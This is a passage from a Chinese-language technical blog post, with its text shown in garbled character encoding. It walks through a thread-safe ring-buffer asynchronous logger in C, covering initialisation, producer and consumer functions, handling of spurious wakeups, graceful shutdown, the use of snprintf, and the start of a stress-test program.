<p>ä¸ºäº†ä¿è¯ä»£ç çš„<strong>å¥å£®æ€§</strong>ä¸<strong>å¯ç»´æŠ¤æ€§</strong>ï¼Œæˆ‘å°†æ ¸å¿ƒé€»è¾‘å°è£…åœ¨ ring_buffer.c ä¸­ï¼Œå¯¹å¤–æä¾›ç®€æ´çš„ APIã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªæœ€å…³é”®çš„å®ç°ç»†èŠ‚ã€‚</p>
<h3 data-id="heading-17">4.1 åˆå§‹åŒ– â€”â€” ä¸€åˆ‡çš„èµ·ç‚¹</h3>
<p>åœ¨åˆå§‹åŒ–é˜¶æ®µï¼Œæˆ‘ä»¬éœ€è¦ç”³è¯·å†…å­˜æ± ï¼Œå¹¶åˆå§‹åŒ–æ‰€æœ‰çš„åŒæ­¥å·¥å…·ï¼ˆé”ä¸æ¡ä»¶å˜é‡ï¼‰ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªè®¾è®¡ç»†èŠ‚ï¼Œä¹Ÿå°±æ˜¯ä¸Šæ–‡æåˆ°çš„ï¼šæˆ‘ä»¬å°† <code>file_fd</code> é»˜è®¤åˆå§‹åŒ–ä¸º <code>STDOUT_FILENO</code> (1)ï¼Œè¿™æ„å‘³ç€é»˜è®¤æƒ…å†µä¸‹æ—¥å¿—ä¼šè¾“å‡ºåˆ°ç»ˆç«¯ï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">void rb_init(RingBuffer *rb, int capacity) {
 Â  Â //ä¸€æ¬¡æ€§ç”³è¯·å †å†…å­˜
 Â  Â rb-&gt;<span class="hljs-attr">entries</span> = (Log *)malloc(sizeof(Log) * capacity)<span class="hljs-comment">;</span>
 Â  Â if (rb-&gt;<span class="hljs-attr">entries</span> == NULL) {
 Â  Â  Â  Â perror("malloc failed")<span class="hljs-comment">;</span>
 Â  Â  Â  Â exit(1)<span class="hljs-comment">;</span>
 Â   }
â€‹
 Â  Â //åˆå§‹åŒ–çŠ¶æ€
 Â  Â rb-&gt;<span class="hljs-attr">capacity</span> = capacity<span class="hljs-comment">;</span>
 Â  Â rb-&gt;<span class="hljs-attr">head</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
 Â  Â rb-&gt;<span class="hljs-attr">tail</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
 Â  Â rb-&gt;<span class="hljs-attr">count</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
 Â  Â rb-&gt;<span class="hljs-attr">is_running</span> = <span class="hljs-number">1</span><span class="hljs-comment">; //æ ‡è®°ç³»ç»Ÿè¿è¡Œä¸­</span>
â€‹
 Â  Â //é»˜è®¤è¾“å‡ºåˆ°ç»ˆç«¯
 Â  Â rb-&gt;<span class="hljs-attr">file_fd</span> = STDOUT_FILE<span class="hljs-literal">NO</span><span class="hljs-comment">;</span>
â€‹
 Â  Â //åˆå§‹åŒ–äº’æ–¥é”å’Œæ¡ä»¶å˜é‡
 Â  Â pthread_mutex_init(&amp;(rb-&gt;mutex), NULL)<span class="hljs-comment">;</span>
 Â  Â pthread_cond_init(&amp;(rb-&gt;cond_producer), NULL)<span class="hljs-comment">;</span>
 Â  Â pthread_cond_init(&amp;(rb-&gt;cond_consumer), NULL)<span class="hljs-comment">;</span>
}
</code></pre>
<p>è¿™ä¸ªåˆå§‹åŒ–å‡½æ•°çš„å†…å­˜åˆ†é…æ­£æ˜¯ç»“åˆäº†æˆ‘ä»¬å‰é¢ä¸€æ¬¡æ€§ç”³è¯·ä¸€å¤§å—è¿ç»­å†…å­˜çš„æ€è·¯ï¼Œåœ¨åŠ å¿«è®¿é—®é€Ÿåº¦çš„åŸºç¡€ä¸Šè¿˜ä¸€å®šç¨‹åº¦ä¸Šä¿æŠ¤äº†Flashã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹<code>is_running</code>æ˜¯ä¸º1çš„ï¼Œä»è¿™ä¸ªæˆå‘˜çš„åå­—å¾ˆå®¹æ˜“å°±èƒ½çœ‹å‡ºå®ƒä¸º1æ˜¯æ˜¯æ­£å¸¸å·¥ä½œçš„ã€‚åé¢åœ¨<code>main</code>å‡½æ•°æˆåŠŸå›æ”¶å…¨éƒ¨ç”Ÿäº§è€…æ—¶å°†è¿™ä¸ªå€¼ç½®ä¸º0ï¼Œåœ¨æ¶ˆè´¹è€…ä¸­æ£€æµ‹è¿™ä¸ªå€¼ä¸º0åæ‰§è¡Œç›¸åº”çš„é€€å‡ºç¨‹åºï¼Œ<strong>é˜²æ­¢ç”Ÿäº§è€…å·²ç»å…¨éƒ¨é€€å‡ºäº†æ¶ˆè´¹è€…è¿˜åœ¨è‹¦è‹¦ç­‰å¾…</strong>æ—¥å¿—ä½œæ— ç”¨åŠŸè¿™ç§æƒ…å†µå‘ç”Ÿã€‚</p>
<p>æ—¥å¿—å†…å®¹çš„é»˜è®¤è¾“å‡ºä½ç½®å°±æ²¡å¿…è¦å†è®²äº†ï¼Œè¿™é‡Œåªæ˜¯ç”¨å®ä»£æ›¿äº†1ï¼Œç›´æ¥ç”¨1ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œé™¤äº†<strong>å¯è¯»æ€§ä¸‹é™</strong>æ²¡æœ‰ä»€ä¹ˆåå¤„ã€‚</p>
<p>æœ€åå°±æ˜¯åˆå§‹åŒ–é”å’Œæ¡ä»¶å˜é‡äº†ï¼Œè¿™é‡Œæˆ‘è®¾è®¡äº†ä¸¤ä¸ªæ¡ä»¶å˜é‡ï¼Œä»åå­—æ¥çœ‹ä¸€ä¸ªæ˜¯å±äºç”Ÿäº§è€…çš„ï¼Œå¦ä¸€ä¸ªæ˜¯å±äºæ¶ˆè´¹è€…çš„ã€‚è‹¥ç¼“å†²åŒºä¸ºç©ºï¼Œåˆ™æ¶ˆè´¹è€…ç¡è§‰ï¼Œç›´åˆ°ç”Ÿäº§è€…ç”Ÿäº§å‡ºæ—¥å¿—å†…å®¹ï¼Œä¼šç”¨ <code>cond_consumer</code> æ¥å«é†’æ¶ˆè´¹è€…ã€‚è‹¥ç¼“å†²åŒºå·²æ»¡ï¼Œåˆ™ç”Ÿäº§è€…ç¡è§‰ï¼Œå½“æ¶ˆè´¹è€…æ¶ˆè´¹æ—¥å¿—å†…å®¹ä½¿å¾—ç¼“å†²åŒºç©ºé—´ç©ºå‡ºæ¥æ—¶ï¼Œä»–ä¼šä½¿ç”¨ <code>cond_producer</code> å«é†’ç”Ÿäº§è€…ã€‚è¿™åœ¨åé¢çš„å…·ä½“ä»£ç å®ç°ä¸­ä¼šç›´è§‚çš„çœ‹åˆ°ã€‚</p>
<h3 data-id="heading-18">4.2 ç”Ÿäº§è€… (<code>Push</code>)æ‹’ç»è™šå‡å”¤é†’</h3>
<p>è¿™æ˜¯<strong>é«˜å¹¶å‘å†™</strong>çš„æ ¸å¿ƒé€»è¾‘ã€‚ä¸ºäº†é˜²æ­¢â€œæƒŠç¾¤æ•ˆåº”â€å’Œâ€œè™šå‡å”¤é†’â€ï¼Œå¿…é¡»ä¸¥æ ¼éµå®ˆ POSIX å¤šçº¿ç¨‹ç¼–ç¨‹è§„èŒƒã€‚</p>
<pre><code class="hljs language-scss" lang="scss">void <span class="hljs-built_in">rb_push</span>(RingBuffer *rb, const Log *entry) {
 Â  Â <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;(rb-&gt;mutex));
â€‹
 Â  Â while (rb-&gt;count == rb-&gt;capacity) {
 Â  Â  Â  Â <span class="hljs-built_in">pthread_cond_wait</span>(&amp;(rb-&gt;cond_producer), &amp;(rb-&gt;mutex));
 Â   }
â€‹
 Â  Â <span class="hljs-comment">// ç›´æ¥ memcpy åˆ°æ•°ç»„å¯¹åº”ä½ç½®</span>
 Â  Â <span class="hljs-built_in">memcpy</span>(&amp;(rb-&gt;entries[rb-&gt;tail]), entry, <span class="hljs-built_in">sizeof</span>(Log));
â€‹
 Â  Â <span class="hljs-comment">// æ›´æ–°ç´¢å¼•</span>
 Â  Â rb-&gt;tail = (rb-&gt;tail + <span class="hljs-number">1</span>) % rb-&gt;capacity;
 Â  Â rb-&gt;count++;
 Â  Â 
 Â  Â <span class="hljs-comment">// å”¤é†’æ¶ˆè´¹è€…</span>
 Â  Â <span class="hljs-built_in">pthread_cond_signal</span>(&amp;(rb-&gt;cond_consumer));
 Â  Â <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;(rb-&gt;mutex));
}
</code></pre>
<p><code>Push</code>è¿™ä¸ªå•è¯å¾ˆå½¢è±¡ï¼Œæˆ‘ç›¸ä¿¡ä¸è§£é‡Šå¤§å®¶ä¹Ÿèƒ½çŸ¥é“è¿™é‡Œåœ¨å¹²ä»€ä¹ˆï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥æŠŠæ—¥å¿—å†…å®¹<code>Push</code>è¿›<code>RingBuffer</code>çš„ã€‚</p>
<p>è¿™é‡Œçš„åˆ¤æ–­ä¸ºä»€ä¹ˆè¦ä½¿ç”¨<code>while</code>å‘¢ï¼Œå¯èƒ½ä¼šæœ‰äº›å–œæ¬¢æ€è€ƒçš„æœ‹å‹è®¤çœŸçœ‹äº†ä¹‹åå‘ç°ï¼Œè¿™é‡Œåªæ˜¯åˆ¤æ–­ä¸€ä¸‹ç¼“å†²åŒºå†…çš„æ—¥å¿—æ•°é‡æ˜¯å¦ç­‰äºç¼“å†²åŒºæœ€å¤§å®¹é‡ï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­ç¼“å†²åŒºæ»¡äº†æ²¡æœ‰ã€‚å¦‚æœæ»¡äº†é‚£å°±ç­‰å‘—ï¼Œæ²¡æ»¡é‚£å°±ç»§ç»­ç”Ÿäº§æ—¥å¿—å‘—ã€‚é‚£æŒ‰é“ç†æ¥è¯´ç”¨<code>if</code>æ¥åˆ¤æ–­ä¹Ÿè¡Œå•Šï¼Ÿå…¶å®æ˜¯ä¸è¡Œçš„ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ª<strong>è™šå‡å”¤é†’</strong>çš„æƒ…å†µã€‚</p>
<p><strong>è™šå‡å”¤é†’</strong>æ˜¯æŒ‡ï¼Œçº¿ç¨‹åœ¨è°ƒç”¨ <code>pthread_cond_wait()</code> å¼€å§‹ç¡è§‰ä¹‹åï¼Œå³ä½¿æ²¡æœ‰ä»»ä½•äººè°ƒç”¨ <code>pthread_cond_signal()</code> æˆ–è€… <code>pthread_cond_broadcast()</code> ï¼Œçº¿ç¨‹ä¹Ÿæœ‰å¯èƒ½è«åå…¶å¦™çš„é†’æ¥ã€‚ä½†è¿™ä¸ªçœ‹ä¼¼å­˜åœ¨æ¼æ´çš„è¡Œä¸ºå…¶å®æ˜¯ POSIX æ ‡å‡†æ˜ç¡®å…è®¸çš„è¡Œä¸ºã€‚å¯¼è‡´è™šå‡å”¤é†’æ¯”è¾ƒå¸¸è§çš„åŸå› æœ‰ï¼šæ“ä½œç³»ç»Ÿè°ƒåº¦å™¨çš„å†…éƒ¨ä¼˜åŒ–ï¼Œå†…å­˜ä¼ªå…±äº«ï¼Œä¿¡å·ä¸­æ–­ç­‰ã€‚æ‰€ä»¥è¯´é†’æ¥å¹¶ä¸ä¸€å®šæ˜¯è¢« <code>signal</code> æˆ–è€… <code>broadcast</code> å”¤é†’çš„ï¼Œæ„æ€å°±æ˜¯æ¡ä»¶ä¸ä¸€å®šèƒ½æ»¡è¶³ã€‚</p>
<p>å¤§å®¶ç°åœ¨æ¥æƒ³è±¡ä¸€ä¸‹è¿™ä¸ªåœºæ™¯ï¼Œå‡å¦‚çº¿ç¨‹<strong>ç”±äºè™šå‡å”¤é†’é†’æ¥</strong>äº†ï¼Œä½†å®é™…ä¸Šè¿™æ—¶ç¼“å†²åŒºè¿˜æ˜¯æ»¡çš„ï¼Œå®ƒåº”è¯¥ç¡è§‰ï¼Œä¸åº”è¯¥é†’ç€ã€‚å¦‚æœä½¿ç”¨äº† <code>if</code> æ¥åˆ¤æ–­ï¼Œå®ƒä¼šä»€ä¹ˆéƒ½ä¸ç®¡ï¼Œç›´æ¥ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œå…ˆæŠŠ <code>entry</code> çš„å†…å®¹æ‹·è´åˆ° <code>RingBuffer</code> ï¼Œç„¶åæ›´æ–°ç´¢å¼•å’Œæ—¥å¿—æ¡æ•°ï¼Œç„¶åå°±å®Œè›‹äº†(â•¯Â°â–¡Â°)â•¯ï¸µ â”»â”â”»ã€‚å› ä¸º<strong>ç¼“å†²åŒºå·²ç»æº¢å‡º</strong>äº†ã€‚</p>
<p>ä½†æ˜¯å¦‚æœè¿™é‡Œä½¿ç”¨<code>while</code>è¿›è¡Œåˆ¤æ–­ï¼Œåœ¨è§¦å‘è™šå‡å”¤é†’åï¼Œä»–ä¼š<strong>é‡æ–°æ£€æŸ¥ç¼“å†²åŒºæ˜¯å¦æ»¡äº†</strong>ï¼Œå¦‚æœæ²¡æ»¡å°±è·³å‡º <code>while</code> ï¼Œç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚å¦‚æœæ»¡äº†é‚£å°±åœ¨æ‰§è¡Œ <code>pthread_cond_wait(&amp;(rb-&gt;cond_producer), &amp;(rb-&gt;mutex));</code> è¿›å…¥ç¡çœ ã€‚ä¸ä¼šå‘ç”Ÿåƒ<code>if</code>é‚£æ ·çš„å¯æ€•åœºæ™¯ã€‚</p>
<h3 data-id="heading-19">4.3 æ¶ˆè´¹è€… (<code>Pop</code>) ä¸ä¼˜é›…é€€å‡º</h3>
<p>æ¶ˆè´¹è€…ä¸ä»…è¦å¤„ç†æ•°æ®ï¼Œè¿˜è¦è´Ÿè´£ç›‘å¬<strong>åœæœºæŒ‡ä»¤</strong>ã€‚å¦‚æœåªæ˜¯ä¸€ä¸ª demo ï¼Œé‚£è®©æ¶ˆè´¹è€…ç›´æ¥æ— é™å¾ªç¯å°±å®Œäº‹äº†ï¼Œåé¢ç›´æ¥ Ctrl+C æš´åŠ›ç»ˆæ­¢ã€‚ä½†æ˜¯å¦‚æœæƒ³çœŸæ­£åº”ç”¨åˆ°å·¥ç¨‹ä¸Šï¼Œé‚£å°±è¦å®ç°<strong>ä¼˜é›…é€€å‡º</strong>ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// å‡½æ•°è¿”å›å€¼ï¼š1 è¡¨ç¤ºæˆåŠŸæ‹¿åˆ°æ•°æ®ï¼Œ0 è¡¨ç¤ºç³»ç»Ÿå…³é—­ä¸”æ— æ•°æ®</span>
int <span class="hljs-built_in">rb_pop</span>(RingBuffer *rb, Log *entry) {
 Â  Â <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;(rb-&gt;mutex));
â€‹
 Â  Â <span class="hljs-comment">// åªæœ‰å½“ç¼“å†²åŒºä¸ºç©ºï¼Œä¸”ç³»ç»Ÿè¿˜åœ¨è¿è¡Œæ—¶ï¼Œæ‰é€‰æ‹©ç­‰å¾…</span>
 Â  Â while (rb-&gt;count == <span class="hljs-number">0</span> &amp;&amp; rb-&gt;is_running) {
 Â  Â  Â  Â <span class="hljs-built_in">pthread_cond_wait</span>(&amp;(rb-&gt;cond_consumer), &amp;(rb-&gt;mutex));
 Â   }
â€‹
 Â  Â <span class="hljs-comment">// å¦‚æœé†’æ¥å‘ç°æ²¡æ•°æ®äº†ï¼Œè€Œä¸”ç³»ç»Ÿæ ‡å¿—ä½å·²å…³é—­ï¼Œé‚£å°±è§£é”åé€€å‡º</span>
 Â  Â if (rb-&gt;count == <span class="hljs-number">0</span> &amp;&amp; !rb-&gt;is_running) {
 Â  Â  Â  Â <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;(rb-&gt;mutex));
 Â  Â  Â  Â return <span class="hljs-number">0</span>; 
 Â   }
â€‹
 Â  Â <span class="hljs-comment">// æ­£å¸¸æ¶ˆè´¹</span>
 Â  Â <span class="hljs-built_in">memcpy</span>(entry, &amp;(rb-&gt;entries[rb-&gt;head]), <span class="hljs-built_in">sizeof</span>(Log));
 Â  Â rb-&gt;head = (rb-&gt;head + <span class="hljs-number">1</span>) % rb-&gt;capacity;
 Â  Â rb-&gt;count--;
â€‹
 Â  Â <span class="hljs-comment">// å”¤é†’ç”Ÿäº§è€…</span>
 Â  Â <span class="hljs-built_in">pthread_cond_signal</span>(&amp;(rb-&gt;cond_producer));
 Â  Â <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;(rb-&gt;mutex));
 Â  Â return <span class="hljs-number">1</span>;
}
</code></pre>
<p>ä»£ç ä¸­å·²ç»æœ‰äº†æ¯”è¾ƒè¯¦ç»†çš„æ³¨é‡Šï¼Œä½†ä¸ºäº†å†…å®¹çš„å…¨é¢æ€§ï¼Œæˆ‘è¿˜æ˜¯ç®€å•ä»‹ç»ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ã€‚</p>
<p>å…ˆæ¥çœ‹ <code>while</code> å¾ªç¯ï¼Œåªæœ‰å½“ç¼“å†²åŒºä¸ºç©ºï¼Œè€Œä¸”ç³»ç»Ÿè¿˜åœ¨è¿è¡Œæ—¶ï¼Œæ‰ç­‰å¾…ã€‚</p>
<p>å¦‚æœç¼“å†²åŒºä¸ºç©ºï¼Œä½† <code>is_running</code> è¢«ç½®ä¸º0äº†ï¼Œé‚£å°±è·³å‡ºå¾ªç¯ï¼Œå¾€ä¸‹æ‰§è¡Œåˆ° <code>if</code> ï¼Œæ¡ä»¶æ»¡è¶³ï¼Œè§£é”åç›´æ¥è¿”å›0ï¼Œåé¢åœ¨æ¶ˆè´¹è€…çº¿ç¨‹ä¸­ä¼šæ£€æŸ¥è¿™ä¸ªè¿”å›å€¼ï¼Œè¿™ä¸ªåˆ°åé¢å†è¯´å§ã€‚</p>
<p>å¦‚æœç¼“å†²åŒºä¸ä¸ºç©ºï¼Œä¸” <code>is_running</code> ä¸º1ï¼Œæ­£å¸¸è¿è¡Œï¼Œé‚£å°±æ˜¯æ­£å¸¸æ¶ˆè´¹åå”¤é†’ç”Ÿäº§è€…ï¼Œå‡½æ•°è¿”å›1ã€‚</p>
<p>å¦‚æœç¼“å†²åŒºä¸ä¸ºç©ºï¼Œä¸” <code>is_running</code> ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç”Ÿäº§è€…å·²ç»å…¨éƒ¨é€€å‡ºäº†ï¼Œä½†ç¼“å†²åŒºè¿˜æœ‰äº›æ—¥å¿—å†…å®¹æ²¡æœ‰è¢«æ¶ˆè´¹ã€‚é‚£æˆ‘ä»¬çš„é€»è¾‘å°±æ˜¯<strong>æ¶ˆè´¹å®Œè¿™äº›æ—¥å¿—å†é€€å‡º</strong>ã€‚æ¥çœ‹ä»£ç ï¼Œè¿™ç§æƒ…å†µä¾ç„¶ä¼šè·³å‡º <code>while</code> å¾ªç¯ï¼Œåœ¨ <code>if</code> åˆ¤æ–­æ˜¯ï¼Œæ˜¯ä¸æ»¡è¶³æ¡ä»¶çš„ï¼Œæ‰€ä»¥ä¸ä¼šåœ¨ <code>if</code> é‡Œé¢é€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œæ­£å¸¸æ¶ˆè´¹æ—¥å¿—ï¼Œå®Œäº†è¿”å›1ï¼Œåˆ°åé¢å¤§å®¶ä¼šçŸ¥é“ï¼Œ<strong>æ¶ˆè´¹è€…çº¿ç¨‹æ˜¯åœ¨å¾ªç¯è°ƒç”¨</strong>è¿™ä¸ªå‡½æ•°çš„ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é‡å¤ä¸Šé¢æè¿°çš„è¿‡ç¨‹ï¼Œç›´åˆ°æ—¥å¿—å…¨éƒ¨è¢«æ¶ˆè´¹å®Œï¼Œç¼“å†²åŒºç©ºäº†ï¼Œè¿™æ—¶æ»¡è¶³ <code>if</code> çš„æ¡ä»¶äº†ï¼Œè¿”å›0ã€‚æ¶ˆè´¹è€…çº¿ç¨‹æ£€æµ‹åˆ°0åä¼˜é›…é€€å‡ºã€‚</p>
<p>è¿™é‡Œæˆ‘è¿˜æƒ³æä¸€ç‚¹ï¼Œæˆ‘åœ¨ 4.2 å’Œ æœ¬èŠ‚4.3 é‡Œéƒ½ç”¨äº† <code>memcpy</code>ã€‚åœ¨è¿™é‡Œä½¿ç”¨ <code>memcpy</code> æ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨ <code>log_push</code> é‡Œå·²ç»ç”¨ <code>snprintf</code> ä¿è¯äº†æºæ•°æ®é•¿åº¦ä¸ä¼šè¶…è¿‡ <code>LOG_MSG_SIZE</code>ï¼Œæ‰€ä»¥ä¸ä¼šå‘ç”Ÿè¶Šç•Œæ‹·è´ã€‚</p>
<p>ä¼˜é›…é€€å‡ºçš„ä»£ç æ²¡ä»€ä¹ˆæ·±åº¦ï¼Œæˆ‘å°±ä¸è§£é‡Šäº†ï¼Œç›´æ¥æ”¾åœ¨ä¸‹é¢ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//ä¼˜é›…é€€å‡º</span>
void <span class="hljs-built_in">rb_stop</span>(RingBuffer *rb)
{
    <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;(rb-&gt;mutex));
â€‹
    rb-&gt;is_running = false;
â€‹
    <span class="hljs-built_in">pthread_cond_broadcast</span>(&amp;(rb-&gt;cond_consumer));<span class="hljs-comment">//å”¤é†’æ¶ˆè´¹è€…</span>
â€‹
    <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;(rb-&gt;mutex));
}
</code></pre>
<h3 data-id="heading-20">4.4 å®‰å…¨æ€§å°è£…æ‹’ç»ç¼“å†²åŒºæº¢å‡º</h3>
<p>åœ¨ C è¯­è¨€ä¸­ï¼Œ<code>strncpy</code> å’Œ <code>sprintf</code> éƒ½æ˜¯ç¼“å†²åŒºæº¢å‡ºçš„é‡ç¾åŒºã€‚ä¸ºäº†ä¿è¯æ—¥å¿—å†…å®¹çš„å®‰å…¨ï¼Œæˆ‘åœ¨ä¸šåŠ¡å°è£…å±‚ä½¿ç”¨äº† <code>snprintf</code>ã€‚</p>
<p><code>snprintf</code> æ˜¯ C è¯­è¨€ä¸­æœ€é‡è¦ï¼Œæœ€å®‰å…¨çš„å­—ç¬¦ä¸²æ ¼å¼åŒ–å‡½æ•°ä¹‹ä¸€ï¼Œå®ƒå‡ ä¹å®Œå…¨å–ä»£äº†è€çš„ <code>sprintf</code>ï¼Œä¹Ÿæ˜¯ç°ä»£ C ä»£ç ä¸­<strong>å”¯ä¸€æ¨èä½¿ç”¨çš„æ ¼å¼åŒ–è¾“å‡ºåˆ°å­—ç¬¦ä¸²çš„å‡½æ•°</strong>ã€‚</p>
<p>MISRA C 2012ï¼ˆæ±½è½¦åµŒå…¥å¼è§„èŒƒï¼‰ï¼š<strong>ç¦æ­¢</strong>ä½¿ç”¨åº“å‡½æ•°<code>sprintf</code>ï¼Œ<code>vsprintf</code> ï¼Œå¿…é¡»ä½¿ç”¨å¸¦é•¿åº¦é™åˆ¶çš„æ›¿ä»£å‡½æ•°ï¼Œå¦‚<code>snprintf</code>ã€<code>vsnprintf</code>ã€‚</p>
<p>Linux å†…æ ¸ã€GNUã€LLVMã€Chromeã€Firefox ç­‰å¤§å‹é¡¹ç›®ï¼šå…¨éƒ¨<strong>ç¦æ­¢</strong> <code>sprintf</code>ï¼Œå¼ºåˆ¶ <code>snprintf</code>ã€‚</p>
<p>é™¤äº†ä¸€äº›å¤§å‹é¡¹ç›®å¯èƒ½è¿˜å­˜åœ¨å†å²é—ç•™çš„<code>sprintf()</code>è°ƒç”¨é—®é¢˜ã€‚åœ¨ç°åœ¨çš„æ–°é¡¹ç›®ä¸­ï¼Œç»å¯¹åº”è¯¥ä½¿ç”¨<code>snprintf</code>è€Œä¸æ˜¯<code>sprintf</code> ï¼Œè¿™æ˜¯å·¥ä¸šç•Œçš„å…±è¯†ï¼Œä¸æ˜¯å¯æœ‰å¯æ— çš„é£æ ¼é—®é¢˜ï¼Œè€Œæ˜¯å®‰å…¨é—®é¢˜ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">log_push</span><span class="hljs-params">(RingBuffer *rb, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span> </span>{
 Â  Â Log log_entry = {<span class="hljs-number">0</span>};
 Â  Â 
 Â  Â <span class="hljs-comment">// å¯ä»¥è‡ªåŠ¨å¤„ç† \0 ç»“å°¾ï¼Œé˜²æ­¢ msg è¿‡é•¿å¯¼è‡´çš„è¶Šç•Œè®¿é—®</span>
 Â  Â <span class="hljs-built_in">snprintf</span>(log_entry.data, LOG_MSG_SIZE, <span class="hljs-string">"%s"</span>, msg);
 Â  Â  Â  Â 
 Â  Â <span class="hljs-built_in">rb_push</span>(rb, &amp;log_entry);
}
</code></pre>
<h2 data-id="heading-21">5. æ€§èƒ½å‹æµ‹ä¸æ€»ç»“</h2>
<p>ä¸ºäº†éªŒè¯è¿™ä¸ªå¼‚æ­¥æ—¥å¿—åº“çš„å¥å£®æ€§ï¼Œæˆ‘è®¾è®¡äº†ä¸€ä¸ª<strong>é«˜å¹¶å‘ + æå°ç¼“å†²åŒº</strong>çš„æµ‹è¯•åœºæ™¯ã€‚</p>
<h3 data-id="heading-22">5.1 å‹æµ‹åœºæ™¯è®¾è®¡</h3>
<p>ä¸ºäº†æ¨¡æ‹Ÿæœ€æ¶åŠ£çš„ç«äº‰ç¯å¢ƒï¼Œæˆ‘ç‰¹æ„å°†ç¼“å†²åŒºå®¹é‡è®¾ç½®å¾—æå°ï¼Œå¼ºè¿«çº¿ç¨‹<strong>é¢‘ç¹å‘ç”Ÿé˜»å¡å’Œå”¤é†’</strong>ã€‚</p>
<p>ç”Ÿäº§è€…ï¼š2ä¸ªçº¿ç¨‹ï¼ˆProducer1ï¼ŒProducer2ï¼‰ï¼Œæ¯ä¸ªç‹‚å‘1000æ¡æ—¥å¿—ã€‚</p>
<p>æ¶ˆè´¹è€…ï¼š1ä¸ªåå°çº¿ç¨‹ã€‚</p>
<p>ç¼“å†²åŒºå®¹é‡ï¼šè®¾ä¸º10ï¼Œè¿™æ„å‘³ç€ç”Ÿäº§è€…æ¯ç”Ÿäº§å‡ æ¡æ—¥å¿—å°±è¦è¢«è¿«ç¡è§‰ï¼Œé”ç«äº‰å°†ä¼šéå¸¸æ¿€çƒˆã€‚</p>
<p>é¢„æœŸç»“æœï¼šæ—¥å¿—æ–‡ä»¶åº”è¯¥åŒ…å«æ•´æ•´2000æ¡æ•°æ®ï¼Œæ— ä¸¢å¤±ï¼Œæ— ä¹±åºï¼ˆçº¿ç¨‹å†…éƒ¨æœ‰åºï¼‰ï¼Œå¹¶ä¸”ç¨‹åºå¯ä»¥ä¼˜é›…é€€å‡ºã€‚</p>
<p>è¿™æ˜¯ main.c çš„å†…å®¹ï¼Œå¤§å®¶å¯ä»¥ç…§ç€æˆ‘ä¸Šé¢çš„è§£é‡Šæ¢³ç†ä¸€ä¸‹é€»è¾‘:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"ring_buffer.h"</span></span>
â€‹
<span class="hljs-meta">#<span class="hljs-keyword">define</span> FILE_NAME <span class="hljs-string">"log.txt"</span></span>
â€‹
<span class="hljs-type">void</span> <span class="hljs-title function_">log_push</span><span class="hljs-params">(RingBuffer *rb,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span>
{
    Log log_entry = {<span class="hljs-number">0</span>};
â€‹
    <span class="hljs-built_in">snprintf</span>(log_entry.data,LOG_MSG_SIZE,<span class="hljs-string">"%s"</span>,msg);<span class="hljs-comment">//æœ€æ¨èçš„å‡½æ•°</span>
        
    rb_push(rb,&amp;log_entry);
}
â€‹
<span class="hljs-type">void</span> *<span class="hljs-title function_">pthread_producer1</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span>
{
    RingBuffer *rb = (RingBuffer *)arg;
â€‹
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1000</span>;i++)
    {
        <span class="hljs-type">char</span> buf[<span class="hljs-number">64</span>];
â€‹
        <span class="hljs-built_in">snprintf</span>(buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-string">"Producer1 code:%d\n"</span>, i);
â€‹
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Producer1 pushing:%s\n"</span>,buf);
â€‹
        log_push(rb,buf);
â€‹
        usleep(<span class="hljs-number">100</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}
â€‹
